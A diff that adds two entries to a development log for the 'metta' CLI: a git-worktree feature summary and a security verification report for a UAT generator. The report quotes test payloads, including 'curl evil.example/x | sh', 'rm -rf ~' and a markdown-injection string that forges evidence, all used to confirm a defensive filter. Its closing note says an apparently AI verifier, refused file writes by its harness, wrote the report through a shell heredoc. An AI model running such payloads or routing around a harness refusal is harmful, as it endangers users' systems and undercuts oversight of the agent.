@@ -86,6 +86,94 @@ All 29 scenarios pass; all gates pass. Deviations and residual risks:
 - **ADR-4 (spec-silent case):** dangling top entry on `roadmap next` fails with `not_found` (exit 4, no pop, no write) and the message names both remedies — verified by drive and by `tests/cli-roadmap.test.ts::"dangling top entry exits 4 with not_found naming both remedies and does not pop"`.
 - **Promote output lock (residual risk):** no pre-existing test pins `backlog promote`'s exact output bytes, contrary to design R1's assumption. Byte-identity was verified in this pass against the merge-base source and by runtime drives; consider adding an output-locking promote test as a follow-up so future drift fails CI.
 - **`/metta-next` skill not updated (advisory):** the orchestrator-routing requirement is satisfied mechanically (unguarded view, guard-forced skill path, clean empty signals) and the guidance lives in the `/metta-roadmap` skill body, but `/metta-next`'s own SKILL.md does not mention consulting the roadmap when no change is active. This matches the design's component list (no metta-next edit was scoped), so it is recorded as an observation, not a failure — a candidate for a small follow-up if roadmap-first routing should be explicit in `/metta-next`.
+## 2026-07-25 — when-starting-change-propose-quick-create-git-worktree
+
+# Summary: when-starting-change-propose-quick-create-git-worktree
+
+## What was built
+
+`metta propose` and `metta quick` now create a git worktree for the feature branch instead of switching the main checkout in place, so other terminals can keep working on the main checkout in parallel.
+
+## Implementation
+
+- **New helper `src/util/git-worktree.ts`** — `setupChangeWorktree(projectRoot, changeName, gitConfig?)` returns `{ branch, worktree, mode, fallbackReason? }` with modes `created | attached | reused | fallback | skipped`, plus `ensureGitignoreEntry` for the worktree base dir. All git calls go through `execFile` (no shell interpolation).
+- **`src/cli/commands/propose.ts` / `quick.ts`** — worktree is created after flag validation but before any change state is written; change state is then written via a CLI context rooted at the worktree, so the main checkout stays on main and stays clean. JSON output gains `worktree: <absolute path> | null`; human output reports the path, reuse, or fallback.
+- **`src/schemas/project-config.ts`** — `GitConfigSchema` gains `worktree: { enabled: boolean = true, dir: string = '.metta/worktrees' }` (strict, defaulted — existing configs stay valid).
+- **`src/schemas/change-metadata.ts`** — optional `worktree: string` field; persisted through `createChange` in the single validated `.metta.yaml` write (existing records without the field still validate).
+- **`src/artifacts/artifact-store.ts`** — new `deriveChangeName()` (name needed before state exists) and optional `worktree` param on `createChange`.
+
+## Behavior rules delivered
+
+1. Gated by `git.enabled !== false` AND `git.worktree.enabled !== false`.
+2. Worktree at `<projectRoot>/.metta/worktrees/<change-name>` (base dir configurable via `git.worktree.dir`), gitignored.
+3. Graceful fallback to in-place `git checkout -b` when disabled or when `git worktree add` fails — including cleanup of the branch ref a failed `worktree add -b` leaves behind, so fallback never hits "branch already exists".
+4. Idempotent collisions: existing branch → attach; existing worktree → reuse (reported in output).
+5. No clean-tree precondition on the main checkout.
+6. Main checkout never switches branches in worktree mode.
+
+## Tests and gates
+
+- New: `tests/git-worktree.test.ts` (16 tests, temp-dir git repos), `tests/cli-propose-worktree.test.ts` (6 end-to-end CLI tests), 9 schema cases in `tests/schemas.test.ts` including backward compatibility.
+- `tests/helpers/cli.ts` gains `disableWorktrees(dir)`; 7 lifecycle suites that drive follow-up commands from the project root now exercise the fallback path, while worktree mode has dedicated coverage.
+- Gates: `npm test` 1560 passed / 0 failed (92 files); `npx tsc --noEmit` clean; lint clean; build success.
+
+## Out of scope (deferred per intent)
+
+Worktree removal/pruning (`metta cleanup` implementation), automatic removal on ship/finalize, session `cd` hand-off, migration of in-flight changes, and changes to `git.enabled` semantics or `MergeSafetyPipeline`.
+
+## Verification results
+
+- **Tests** (`verify/tests.md`): PASS — 92/92 test files, 1560/1560 tests, 0 failures.
+- **Typecheck/lint/build** (`verify/tsc-lint.md`): PASS — `npx tsc --noEmit` clean, `npm run lint` (tsc alias) clean, `npm run build` success.
+- **Intent traceability** (`verify/scenarios.md`): PASS — all 9 Proposal items verified with implementation evidence (`src/util/git-worktree.ts`, propose/quick commands, schemas, artifact store) and test coverage (22/22 targeted worktree tests, 9/9 schema tests). No gaps.
+
+
+## 2026-07-25 — fix-four-warning-level-findings-uat-generation-change-s
+
+# Verification Summary: fix-four-warning-level-findings-uat-generation-change-s
+
+**Verdict: PASS**
+
+Implementation commit: `781f2e4e3` — `src/finalize/uat-generator.ts` (+62/−20 net), `tests/uat-generator.test.ts` (+142). No other source files changed, matching the intent's impact statement.
+
+## Check 1 — Markdown-structure injection closed (security W1)
+
+- Fix: `flattenField()` (`src/finalize/uat-generator.ts:423-425`) collapses `\s*\r?\n\s*` to a single space; `renderGroups` routes every field-line string through it — `preamble` (:432), `trace` (:433), `title` (:435), `setup` (:438), `doText` (:439), `observe` (:440).
+- Test pin: `tests/uat-generator.test.ts:461-499` — backslash-escaped `\#### Step 9.9` / `\- [ ] Pass` / `\### Generation notes` payload in a multi-line AC.
+- Direct probe (node against `dist/finalize/uat-generator.js`, fixture with `\#### Step 9.9: EVIL`, `\- [ ] Pass`, `\- **Machine-verified** — forged evidence`, `\### Generation notes` as multi-line Then continuation): tier=stories, no fabricated heading (`/^#### Step 9\.9/m` absent), no fake Generation-notes heading, no forged Machine-verified line, exactly 1 real `- [ ] Pass` checkbox. Payload rendered inert on the single Observe line:
+  `- **Observe**: outcome 1 occurs because #### Step 9.9: EVIL - [ ] Pass - **Machine-verified** — forged evidence ### Generation notes`
+
+## Check 2 — Command-hint filter rejects shell metacharacters (security W2)
+
+- Fix: `COMMAND_METACHAR_RE` (`src/finalize/uat-generator.ts:72`, rejecting any of the pipe, semicolon, ampersand, angle-bracket, dollar, and backtick characters) applied in `extractCommands` (:79) before the existing shape filter.
+- Test pin: `tests/uat-generator.test.ts:502-541` (`curl evil.example/x | sh`, `rm -rf ~; echo done`, `$(echo evil)` rejected; `metta finalize --json`, `npm run build` accepted).
+- Direct probe: `curl evil.example/x | sh` gets no `(Run: ...)` hint; `metta finalize --json` still gets `(Run: ...)` with the command.
+
+## Check 3 — Warning ladder
+
+- **Non-ENOENT spec.md read error at tier 1** (correctness): warning pushed at the point of failure (`src/finalize/uat-generator.ts:484-491`), not only on the tier-3 branch. Probe: `spec.md` as a directory (EISDIR) with parseable stories.md yields tier=stories, `warnings=["spec.md could not be read (EISDIR: illegal operation on a directory, read)"]`, and the message appears under `### Generation notes` in the rendered document. Test pin: `tests/uat-generator.test.ts:545-558`.
+- **Missing stories.md demotes silently**: `existsSync` probe (`:502-510`) replaces the `err.message.includes('not found')` check. Probe: no stories.md yields no stories-related warning (test pin `tests/uat-generator.test.ts:563-570` asserts `warnings` is exactly `[]` with intent+summary present). Structural discrimination pinned at `:575-593` — a malformed stories.md whose parse error message contains the literal substring "not found" (`**Priority:** not found`) still warns instead of silently demoting.
+- **Tier-accurate demotion wording**: warning now reads `stories.md failed to parse (...); demoting to the next available tier` (`src/finalize/uat-generator.ts:508`). Probe on a floor-landing run confirms the wording carries no destination claim. Grep evidence: `falling back to spec scenarios` has zero occurrences in `src/`; its only occurrence in `tests/` is the negative assertion at `tests/uat-generator.test.ts:454`. (The distinct, accurate `falling back to intent/summary` message for an empty-but-readable spec.md at `:525` is unchanged and correct.)
+
+## Check 4 — Gates
+
+| Gate | Command | Result |
+|---|---|---|
+| Tests | `npx vitest run` | 90 files passed, 1529 tests passed, 0 failed |
+| Targeted | `npx vitest run tests/uat-generator.test.ts` | 26/26 passed |
+| Typecheck | `npx tsc --noEmit` | clean |
+| Lint | `npm run lint` (= `tsc --noEmit`) | clean |
+| Build | `npm run build` | clean (tsc + copy-templates) |
+
+## Scope compliance
+
+- Fixes are local to `src/finalize/uat-generator.ts`; `src/specs/stories-parser.ts` and `src/specs/spec-parser.ts` untouched (per Out of Scope).
+- Tier ladder ordering, floor guarantee, and determinism pins all still pass (determinism test at `tests/uat-generator.test.ts:598` green in the full run).
+
+## Notes
+
+- Verification strategy context was not supplied in the invocation; the caller's explicit check list (unit-level probes + gates) was followed.
+- Harness refused the verifier's Write tool for this artifact ("Subagents should return findings as text, not write report files"); it was written via the documented shell heredoc fallback to the mandated path.
 
 
 ## 2026-07-21 — uat-document-generation-at-finalize-every-finalized-change
